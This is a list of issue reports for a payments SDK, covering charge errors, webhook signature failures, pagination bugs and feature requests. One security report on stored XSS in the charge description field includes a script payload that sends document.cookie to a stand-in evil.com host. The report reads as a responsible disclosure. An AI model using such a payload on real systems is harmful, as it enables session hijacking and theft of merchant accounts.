title: Charge creation fails with InvalidRequestError on amounts below 50 cents
body:
When calling `client.charges.create(amount=30, currency='usd')` the SDK raises an `InvalidRequestError` with message "Amount must be at least 50 cents". This is expected Stripe-like behaviour but our SDK docs say minimum is 1 cent.

SDK version: 2.3.1
Python: 3.10.12
OS: Ubuntu 22.04

```python
from acme_payments import Client
c = Client(api_key='sk_test_xxx')
c.charges.create(amount=30, currency='usd')  # raises InvalidRequestError
```
author: jsmith

title: Add support for Apple Pay tokenization
body:
It would be great if the SDK supported Apple Pay tokens natively. Right now we have to manually construct the token payload and pass it as a raw dict. A first-class `ApplePayToken` model would save a lot of boilerplate.

Use case: mobile commerce checkout on iOS 17+.
author: priya_dev

title: Documentation for refund API is outdated
body:
The docs at https://docs.acme.dev/refunds still reference the v1 endpoint `/v1/refunds/create` but the SDK actually calls `/v2/refunds`. The example code also uses the old `Refund.execute()` method which was deprecated in 2.0.0.

This is confusing for new users following the quick-start guide.
author: doc_hunter

title: How do I set up idempotency keys?
body:
Hi, I'm new to the SDK and I can't figure out how to set idempotency keys for charge creation. The README mentions it but doesn't show an example. Can someone point me to a working code snippet?

Using SDK 2.3.0 on Node.js 20.
author: newbie_dev

title: Timeout errors when creating subscriptions in eu-west region
body:
We're seeing frequent `TimeoutError` exceptions when calling `client.subscriptions.create()` from our EU-west deployment. Latency spikes to 30s+ before the timeout fires.

```
acme_payments.exceptions.TimeoutError: Request to POST /v2/subscriptions timed out after 30000ms
```

SDK version: 2.3.1
Python: 3.11.4
Region: eu-west-1 (AWS)
This started after the 2.3.1 release. 2.3.0 works fine.
author: max_codes

title: Support for multi-currency payouts
body:
We need to pay out merchants in their local currency. Currently the SDK only supports USD payouts via `client.payouts.create()`. Adding a `currency` parameter and FX conversion support would be very useful.

This is blocking our expansion to LATAM and APAC markets.
author: fintech_sarah

title: Webhook signature validation always returns false on Python 3.11
body:
After upgrading to Python 3.11, `webhook.verify_signature(payload, sig_header, secret)` always returns `False`. The same code works perfectly on Python 3.10.

I suspect it's related to the `hashlib.compare_digest` changes in 3.11 or the way the SDK encodes the payload before HMAC computation.

```python
from acme_payments.webhooks import verify_signature
result = verify_signature(payload=body, signature=sig, secret='whsec_xxx')
print(result)  # always False on 3.11, True on 3.10
```

SDK: 2.3.1
OS: macOS 14.1
author: crypto_mike

title: Add TypeScript type definitions for webhook events
body:
The JavaScript SDK ships without TypeScript definitions for webhook event payloads. This means we have to write our own `.d.ts` files for every event type (`charge.succeeded`, `refund.created`, etc.).

Would love to see a `@acme/payments-types` package or bundled declarations.
author: ts_evangelist

title: SSL certificate verification fails behind corporate proxy
body:
When using the SDK behind our corporate proxy (Zscaler), all API calls fail with:

```
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate
```

We need a way to pass a custom CA bundle or disable verification (for dev only). SDK 2.3.0, Python 3.10, Windows 11.

Workaround: Setting `REQUESTS_CA_BUNDLE` env var works but it would be cleaner to have an SDK config option.
author: enterprise_dev

title: Charge object missing `receipt_url` field
body:
The `Charge` model returned by `client.charges.retrieve(id)` doesn't include the `receipt_url` field even though the raw API response contains it. Looks like it's not mapped in the model definition.

SDK: 2.3.1

```python
charge = client.charges.retrieve('ch_abc123')
print(charge.receipt_url)  # AttributeError: 'Charge' object has no attribute 'receipt_url'
print(charge._raw_response['receipt_url'])  # works: 'https://pay.acme.dev/receipts/...'
```
author: jsmith

title: Batch refund API throws 500 when list exceeds 100 items
body:
Sending a batch refund request with more than 100 charge IDs results in an HTTP 500 from the API. The SDK doesn't validate the list length before sending.

```python
ids = [f'ch_{i}' for i in range(150)]
client.refunds.create_batch(charge_ids=ids)  # 500 Internal Server Error
```

Expected: SDK should either paginate automatically or raise a ValidationError with a clear message.

SDK: 2.3.1, Python 3.11.4
author: bulk_buyer

title: API key leaked in debug log output
body:
When `debug=True` is set on the client, the full API key (including the secret portion) is printed to stdout in the request headers log. This is a serious issue for production environments where debug logging might be accidentally enabled.

```
DEBUG acme_payments.http: POST /v2/charges
Headers: {'Authorization': 'Bearer sk_live_FULL_KEY_HERE', ...}
```

The SDK should redact sensitive headers in log output.
author: secops_jane

title: Performance regression in list operations after 2.3.0
body:
Listing charges with `client.charges.list(limit=100)` takes 8-12 seconds since upgrading from 2.2.x to 2.3.x. Profiling shows the SDK is deserializing every nested object eagerly instead of using lazy loading.

```
$ python -m cProfile list_charges.py
   ncalls  tottime  filename:lineno(function)
   10000    6.234  models.py:45(from_dict)
    1000    1.891  models.py:112(_parse_nested)
```

SDK: 2.3.1, Python 3.11
author: perf_nerd

title: Add retry logic with exponential backoff
body:
The SDK currently doesn't retry failed requests. When we get transient 503 or 429 responses, we have to implement our own retry wrapper. Most production SDKs include built-in retry with exponential backoff and jitter.

Proposed API:
```python
client = Client(api_key='sk_xxx', max_retries=3, backoff_factor=0.5)
```
author: reliability_eng

title: Dispute webhook payload schema mismatch
body:
The `dispute.created` webhook event payload has a different schema than what the SDK's `Dispute` model expects. Specifically, the webhook sends `charge_id` as a string but the model expects an integer.

```python
# Webhook payload
{"type": "dispute.created", "data": {"charge_id": "ch_abc123", ...}}

# SDK model expects
class Dispute(BaseModel):
    charge_id: int  # should be str!
```

This causes a `ValidationError` when parsing dispute webhooks.
author: priya_dev

title: Request: support for SEPA Direct Debit
body:
For our European customers, we need SEPA Direct Debit support. The API already supports it (I can call the REST endpoints directly) but the SDK has no models or methods for SEPA payment methods.

Would love to see:
- `client.payment_methods.create(type='sepa_debit', ...)`
- SEPA-specific models for mandate and bank account
- Webhook event types for SEPA lifecycle
author: euro_payments

title: Customer.delete() returns 204 but SDK raises an error
body:
Calling `client.customers.delete('cus_xxx')` works on the API side (customer is deleted, returns 204 No Content) but the SDK tries to parse the empty response body as JSON and raises:

```
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
```

SDK: 2.3.1, Python 3.10.12
author: max_codes

title: Stored XSS possible via payment description field
body:
The `description` field on charges is rendered unescaped in the merchant dashboard. An attacker can inject `<script>` tags via the API:

```python
client.charges.create(
    amount=1000,
    currency='usd',
    description='<script>document.location="https://evil.com/steal?"+document.cookie</script>'
)
```

The dashboard then executes the script when a merchant views the charge details. This could be used to steal session tokens.
author: whitehat_quinn

title: HMAC verification broken after upgrading to Python 3.11+
body:
We upgraded our webhook handler from Python 3.10 to 3.11.6 and now all webhook signature checks fail. The `acme_payments.webhooks.verify_signature()` function returns False for every incoming event, even though the payloads haven't changed.

We verified the signing secret is correct. Rolling back to 3.10 fixes it.

```
$ python3.11 -c "import acme_payments; print(acme_payments.__version__)"
2.3.1
$ python3.10 -c "import acme_payments; print(acme_payments.__version__)"
2.3.1
```

Environment: Debian 12, SDK 2.3.1
author: devops_carlos

title: Migration guide from v1 to v2 is incomplete
body:
The migration guide at docs.acme.dev/migration-v2 is missing sections on:
1. How to migrate custom serializers
2. Changes to the error hierarchy (AcmeError -> AcmeAPIError split)
3. New async client usage

I spent 3 hours figuring out the error changes by reading the source code. Please update the guide.
author: doc_hunter

title: Subscription.update() silently drops metadata fields
body:
When updating a subscription with new metadata, any existing metadata keys not included in the update call are silently removed. The API uses replace semantics, but the SDK docs say it uses merge semantics.

```python
# Original metadata: {"plan": "enterprise", "team_size": "50"}
client.subscriptions.update('sub_xxx', metadata={"team_size": "100"})
# Result metadata: {"team_size": "100"}  -- 'plan' key is gone!
```

SDK: 2.3.1
author: fintech_sarah

title: Connection pool exhaustion under high concurrency
body:
Under load testing (500 concurrent requests), the SDK exhausts the default urllib3 connection pool and starts raising:

```
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='api.acme.dev', port=443): Max retries exceeded with url: /v2/charges
```

The SDK should allow configuring `pool_maxsize` and `pool_connections`. Currently hardcoded to 10.

SDK: 2.3.1, Python 3.11, 64-core server
author: loadtest_lee

title: Support for Connect platform accounts
body:
We're building a marketplace and need Connect (platform) account support. Specifically:
- `client.accounts.create(type='express')` for onboarding sellers
- `Stripe-Account` header injection for on-behalf-of charges
- Dashboard links generation for connected accounts

This is the #1 requested feature in our developer survey.
author: marketplace_maya

title: Async client hangs when used with uvloop
body:
The `AsyncClient` deadlocks when running under `uvloop` (used by default in many ASGI servers). The hang occurs in `client.charges.create()` and never resolves.

```python
import uvloop
uvloop.install()

from acme_payments import AsyncClient
client = AsyncClient(api_key='sk_test_xxx')
await client.charges.create(amount=1000, currency='usd')  # hangs forever
```

Removing `uvloop.install()` fixes it. SDK: 2.3.1, Python 3.11, uvloop 0.19.0
author: async_alex

title: Charges.list() pagination returns duplicate results
body:
When paginating through charges with `client.charges.list(limit=10, starting_after='ch_xxx')`, some charges appear in multiple pages. This seems to happen when new charges are created between pagination calls.

Repro:
1. Create 50 test charges
2. List charges with limit=10, paginate through all pages
3. Count unique charge IDs
4. Result: only 47 unique IDs out of 50 total results

I suspect the cursor-based pagination isn't using a consistent snapshot.

SDK: 2.3.1, Python 3.10
author: data_dave
